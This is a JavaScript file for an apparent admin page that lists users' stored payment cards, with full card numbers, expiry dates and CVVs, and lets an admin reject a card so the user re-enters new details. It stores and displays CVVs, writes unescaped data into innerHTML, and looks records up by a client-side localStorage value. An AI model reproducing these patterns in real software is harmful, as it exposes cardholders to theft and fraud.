const table = document.getElementById('table');
let slno = 1;
let backtoadminpannel=document.getElementById('backtoadminpannel');
let alert=document.getElementById("alert");
let index=5;
let id="";
manipulate();

async function manipulate()
{
    let response=await searching();
    for(let i=0;i<response.length;i++)
    {
    if(response[i].status=='disapproved')
    {
        table.innerHTML+=` <tr class='bg-danger text-light'>
        <td>${response[i].mobileNumber}</td>
        <td>${response[i].cardnumber}</td>
        <td>${response[i].name}</td>
        <td>${response[i].expDate}</td>
        <td>${response[i].cvv}</td>
        <td><button type="button" class="btn btn-warning btn-sm disabled">Reject Card</button></td>
    </tr>`
    }
    else
    {
        table.innerHTML+=` <tr>
        <td>${response[i].mobileNumber}</td>
        <td>${response[i].cardnumber}</td>
        <td>${response[i].name}</td>
        <td>${response[i].expDate}</td>
        <td>${response[i].cvv}</td>
        <td><button type="button" class="btn btn-warning btn-sm" value="${response[i]._id}" onClick="clicking(this)">Reject Card</button></td>
    </tr>`
    index=index+7;
    }
    }
}
async function clicking(btn)
{
    let id=btn.value;
    console.log(id);
    const data= await cardApprovation(id);
    
    if(data)
    {
        //this is for showing the alert box
        alert.classList.remove("d-none");
        setTimeout(() => {
            alert.classList.add("d-none");
        }, 4000);
    }
    btn.parentElement.parentElement.classList.add('bg-danger');
    btn.parentElement.parentElement.classList.add('text-light');
    btn.classList.add('disabled');
    
    /*document.getElementsByTagName('tr').classList.add('bg-danger');
    document.getElementsByTagName('tr')[1].classList.add('text-light');
    document.getElementsByTagName('button')[0].classList.add('disabled');*/
}

backtoadminpannel.addEventListener('click',()=>{
    window.document.location=`/adminpannel`;
})

//to get the particular card number so we using serching function hear
async function searching()
{
    const url=`/api/cardFetching`;
    const data={
    "mobileNumber":`${localStorage.getItem('mobileNumber')}`,
      }
    const params={
        method:'post',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(data)
    }
    const response=await fetch(url,params);
    const myjson=await response.json();
    return myjson;
}

//disapproving the card details so the user can enter the new card details

async function cardApprovation(id)
{
    const url=`/api/cardApprovation`;
    const data={
             "id":id,
      }
    const params={
        method:'post',
        headers:{
            'Content-Type':'application/json'
        },
        body:JSON.stringify(data)
    }
    const response=await fetch(url,params);
    const myjson=await response.json();
    return myjson;
}
